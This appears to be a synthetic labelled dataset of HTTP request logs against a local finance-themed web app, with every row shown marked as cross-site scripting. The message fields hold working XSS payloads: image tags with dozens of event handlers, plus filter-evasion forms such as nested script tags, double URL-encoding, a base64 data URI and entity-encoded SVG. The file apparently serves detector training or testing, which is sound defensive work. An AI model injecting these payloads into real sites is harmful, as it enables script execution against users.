mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"application/json, */*",2055950238761277001,http://127.0.0.1:5000/credit/38ktjvsa,10.205.153.135,55118,POST,Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.8.1.2) Gecko/20060601 Firefox/2.0.0.2 (Ubuntu-edgy),"alert;pg(""XSS"")",true
"image/jpeg, text/html, image/png, */*",5715932732142653435,http://127.0.0.1:5000/invest/f361f4a3,10.39.74.15,38935,POST,"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.702.0 Chrome/12.0.702.0 Safari/534.24",<svg/onload=%26%23097lert%26lpar;1337)>,true
"application/json, image/jpeg, text/plain, text/html, */*",3693745132403883610,http://127.0.0.1:5000/debit/bl4cxmg0,10.175.120.130,80961,POST,Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10,<script>for((i)in(self))eval(i)(1)</script>,true
"application/json, text/html, image/jpeg, */*",7175636787900189616,http://127.0.0.1:5000/stock/8weh383h,10.253.183.69,90860,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/124 (KHTML, like Gecko) Safari/125.1",<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,true
"image/png, application/json, image/jpeg, */*",3328140996690220395,http://127.0.0.1:5000/capital/ebe0jtkd,10.19.88.222,78466,GET,Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.19-16mdk i686) Opera 6.11  [en],<sCR<script>iPt>alert(1)</SCr</script>IPt>,true
"text/html, */*",7317926385814360349,http://127.0.0.1:5000/equity/mf63ckjq,10.86.167.252,13395,POST,Mozilla/5.0 (Linux 2.4.18-ltsp-1 i686; U) Opera 6.1  [en],"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",true
"application/json, image/png, text/html, */*",2194584879193942686,http://127.0.0.1:5000/mortgage/rc3csxl6,10.67.181.86,17833,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0  [de],%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,true
"application/json, text/html, image/jpeg, */*",6589708126097361676,http://127.0.0.1:5000/withdrawal/jcd4abet,10.19.7.252,21508,GET,Opera/9.00 (Windows NT 5.1; U; nl),"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, image/png, */*",4309563028431672169,http://127.0.0.1:5000/fund/gdfybf7u,10.83.41.162,74839,GET,Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.6) Gecko/20060808 Fedora/1.5.0.6-2.fc5 Firefox/1.5.0.6,"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, image/jpeg, */*",5656553584116690735,http://127.0.0.1:5000/transaction/cow2igsk,10.64.184.79,68080,OPTIONS,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070719 CentOS/1.5.0.12-0.3.el4.centos Firefox/1.5.0.12,"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, application/json, */*",1410965476437120844,http://127.0.0.1:5000/market/yywmkc96,10.189.234.226,88029,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.6 (KHTML, like Gecko) Safari/125.12_Adobe","<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, image/jpeg, */*",9047852554491053882,http://127.0.0.1:5000/interest/jj3uhfpp,10.211.243.56,20033,GET,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64),"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/html, image/png, */*",5726654753907721425,http://127.0.0.1:5000/portfolio/mwbr05mq,10.159.44.7,72546,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, image/png, application/json, text/plain, */*",4696961574832106280,http://127.0.0.1:5000/interest/2qeh20yb,10.85.55.21,49735,OPTIONS,Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607),"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/html, */*",5018185566341656095,http://127.0.0.1:5000/market/jymffum0,10.175.177.150,62794,POST,Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC),"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, text/html, image/png, */*",6103579812472413777,http://127.0.0.1:5000/withdrawal/plwnhrpd,10.86.83.185,29813,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, */*",4773711879545308133,http://127.0.0.1:5000/credit/jhnx0bcj,10.51.169.229,10998,POST,Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5,"<IMG SRC=x onoffline=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",6436985921015784755,http://127.0.0.1:5000/debit/f34xadia,10.93.174.202,12857,POST,Mozilla/4.0 (compatible; MSIE 6.0; Windows CE) Opera 8.0  [en],"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, application/json, text/plain, */*",3659804703076106853,http://127.0.0.1:5000/withdrawal/j13canxo,10.214.31.133,82730,GET,"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1","<IMG SRC=x onpageshow=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, text/plain, */*",6816600095296651586,http://127.0.0.1:5000/loan/kshjf8qm,10.160.30.71,80600,PUT,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-CH) AppleWebKit/419.2 (KHTML, like Gecko) Safari/419.3","<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, text/plain, image/jpeg, */*",73498949906079415,http://127.0.0.1:5000/balance/2dl6er9w,10.231.62.19,24085,POST,Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727),"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, image/jpeg, image/png, */*",4716462190297842627,http://127.0.0.1:5000/loan/qlinvuxy,10.146.240.245,74871,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5,"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, */*",868685930737139994,http://127.0.0.1:5000/debit/awqamm38,10.110.155.208,27799,GET,Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.50,"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, text/html, image/jpeg, */*",8749025365824095159,http://127.0.0.1:5000/withdrawal/y30fkv1o,10.5.22.240,34378,POST,Mozilla/5.0 (Windows NT 5.1; U) Opera 7.11  [en],"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/plain, image/png, text/html, */*",1475429822916646303,http://127.0.0.1:5000/stock/btukecwx,10.184.165.119,50684,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",3363564558313416007,http://127.0.0.1:5000/portfolio/e6sghtgs,10.60.243.124,33369,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) Chrome/4.0.223.3 Safari/532.2,"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, */*",5776775607147377126,http://127.0.0.1:5000/interest/mx6ju52n,10.95.183.250,65115,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3","<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, application/json, */*",5798843558627306751,http://127.0.0.1:5000/debit/n8fiuhp8,10.40.129.16,77597,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ja-jp) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2","<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, image/png, */*",8791681451124435824,http://127.0.0.1:5000/loan/bo368xuh,10.179.223.107,87930,POST,"Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2","<IMG SRC=x onreset=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, image/jpeg, image/png, */*",7761959689584992887,http://127.0.0.1:5000/dividend/reyo7ik1,10.191.7.238,27008,POST,Opera/9.01 (Windows NT 5.1),"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",8725985145451576346,http://127.0.0.1:5000/fund/hrp0isd2,10.107.167.38,1481,POST,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.8 Safari/532.2","<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, image/jpeg, */*",5216670436525213925,http://127.0.0.1:5000/loan/ipvyw7w1,10.197.79.52,89954,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es-es) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3","<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, application/json, */*",604454227262588533,http://127.0.0.1:5000/equity/mpt1k6n2,10.161.192.64,92435,POST,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0","<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, image/jpeg, text/html, image/png, */*",5757371263122260396,http://127.0.0.1:5000/credit/9li9wbld,10.191.252.27,27657,POST,Opera/9.23 (X11; Linux x86_64; U; en),"<IMG SRC=x onkeypress=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, image/jpeg, application/json, text/plain, */*",5691865038178931988,http://127.0.0.1:5000/interest/n0jptv2t,10.130.176.13,45794,POST,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, application/json, image/png, */*",4435664240081339450,http://127.0.0.1:5000/loan/gbgz8v93,10.154.185.175,38578,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3","<IMG SRC=x onclick=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, image/jpeg, application/json, text/html, */*",2811952241572598229,http://127.0.0.1:5000/interest/u4wbjqxj,10.212.65.20,96812,PUT,Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS),"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, image/png, image/jpeg, application/json, */*",1775608826024183596,http://127.0.0.1:5000/loan/ughqe93m,10.65.145.6,11492,OPTIONS,Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; ),"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/html, */*",5919554022658277830,http://127.0.0.1:5000/dividend/zszguaz0,10.111.85.106,81068,POST,Opera/7.23 (Windows NT 5.0; U)  [en],"<IMG SRC=x onmousemove=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, image/png, */*",1049997237077785810,http://127.0.0.1:5000/invest/yv1ywe10,10.159.167.6,30252,PUT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<IMG SRC=x onmouseout=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/plain, */*",8354243265545746011,http://127.0.0.1:5000/stock/to6pbmcd,10.111.88.138,11156,GET,Mozilla/5.0 (Windows NT 5.0; U) Opera 7.11  [en],"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, text/html, image/jpeg, */*",7747873877954989195,http://127.0.0.1:5000/stock/l0db5s6r,10.224.236.109,63932,POST,"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3","<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",7647456822419144335,http://127.0.0.1:5000/equity/x8mezrte,10.233.115.89,46981,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","<IMG SRC=x onmousewheel=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, image/jpeg, text/plain, */*",695680653637451030,http://127.0.0.1:5000/balance/lj0igr3k,10.98.120.11,3621,POST,Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00,"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, image/jpeg, text/html, application/json, */*",2359558263635792673,http://127.0.0.1:5000/mortgage/aaxctqmp,10.91.76.103,44773,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0; sr; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12,"<IMG SRC=x ondrag=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, */*",7934994557643138929,http://127.0.0.1:5000/transaction/51804rut,10.2.116.213,40759,GET,Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0),"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, text/plain, text/html, */*",1419343115228945727,http://127.0.0.1:5000/capital/1h40ry64,172.30.58.215,90427,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, image/png, application/json, image/jpeg, */*",3610534953285052363,http://127.0.0.1:5000/transaction/jhu64di1,10.198.43.118,44701,POST,Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8),"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, application/json, */*",1478581223259256572,http://127.0.0.1:5000/capital/6pr4rmp6,10.42.47.34,52016,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, image/jpeg, text/html, */*",532953898751120103,http://127.0.0.1:5000/stock/x62ue37b,172.25.73.124,68258,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; ru-ru) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1","<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, application/json, text/plain, */*",7690256311217963225,http://127.0.0.1:5000/capital/59m5zhin,10.81.202.96,800,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",4161209152281897029,http://127.0.0.1:5000/transaction/323gorhq,10.248.14.200,81325,GET,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021714 Firefox/3.0b4pre (Swiftfox),"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",3995279128326743784,http://127.0.0.1:5000/interest/dj7v55by,10.211.94.169,22152,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, text/plain, */*",6068794523328957806,http://127.0.0.1:5000/deposit/1py9c1i6,10.121.56.79,57706,GET,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101219 Gentoo Firefox/3.6.13,"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/html, image/jpeg, text/plain, */*",1337166552291331376,http://127.0.0.1:5000/debit/pk59ueck,10.179.104.144,22268,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT; rv:1.7.7) Gecko/20050414 Firefox/1.0.3,"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, image/png, text/plain, image/jpeg, */*",3984300262309139492,http://127.0.0.1:5000/credit/r5h7if6a,10.219.231.34,20340,POST,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090405 Firefox/3.6a1pre,"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, application/json, image/jpeg, */*",1409725279192809415,http://127.0.0.1:5000/loan/wpowtpmy,10.210.12.12,18885,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10","<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",true
"text/plain, text/html, image/jpeg, */*",5210926815986530889,http://127.0.0.1:5000/fund/wiiyiphi,10.24.83.224,38761,POST,Mozilla/5.0 (Windows; U; Windows NT 6.1; et; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9,"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, */*",1025920956503506661,http://127.0.0.1:5000/invest/wveg1xp5,10.181.215.81,16712,POST,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/html, application/json, text/plain, */*",6663636417940019919,http://127.0.0.1:5000/capital/el1xxfbb,10.180.79.156,25593,OPTIONS,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, image/png, text/html, */*",2700246986531541599,http://127.0.0.1:5000/interest/jhujhwt4,10.27.168.220,22180,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.15) Gecko/2009101601 Firefox 2.1 (.NET CLR 3.5.30729),"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, */*",748628164319461591,http://127.0.0.1:5000/dividend/2ob45x23,10.84.41.95,88383,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<IMG SRC=x onended=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, image/jpeg, image/png, */*",4726144496437250951,http://127.0.0.1:5000/portfolio/phpq29cs,10.17.228.173,64104,GET,Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.4) Gecko/20070621 Firefox/2.0.0.4,"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, text/html, */*",2300907986952271709,http://127.0.0.1:5000/account/i5663pgr,10.241.156.67,6060,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, application/json, text/html, image/png, */*",6114424533750377714,http://127.0.0.1:5000/deposit/r1f8ypb4,10.58.90.241,77724,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100312 Ubuntu/9.04 (jaunty) Firefox/3.6,"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, image/jpeg, application/json, text/html, */*",8112320176931965168,http://127.0.0.1:5000/invest/g880a0k9,10.245.209.246,67943,POST,Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.1) Gecko/20060213 Firefox/1.5.0.1,"<IMG SRC=x onloadstart=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, image/png, text/plain, application/json, */*",7221868552760227735,http://127.0.0.1:5000/deposit/k0umolz7,10.228.71.46,63340,POST,Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR),"<IMG SRC=x onpause=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, */*",392693240887748030,http://127.0.0.1:5000/mortgage/bffig84i,10.57.146.156,80852,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220),"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",true
"image/jpeg, */*",4672007096264005783,http://127.0.0.1:5000/debit/cqz6fcdg,10.197.117.103,5640,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",true
"image/png, application/json, */*",6079226641380435040,http://127.0.0.1:5000/equity/ga4wv6tz,10.181.91.26,10721,PUT,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.414.0 Safari/534.1","<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, */*",5042605791325900930,http://127.0.0.1:5000/equity/9ohrlyse,10.105.39.19,85421,POST,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200,"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, text/plain, text/html, image/jpeg, */*",3413708252116287037,http://127.0.0.1:5000/mortgage/pfgv72bq,10.118.79.43,79252,POST,Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT),"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",true
"application/json, image/png, image/jpeg, */*",3279415258379595138,http://127.0.0.1:5000/mortgage/pg8tw0bt,10.90.25.94,6798,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",true
"text/html, text/plain, */*",356852598711236561,http://127.0.0.1:5000/portfolio/z315s82w,10.240.23.149,31969,POST,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200,"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",true
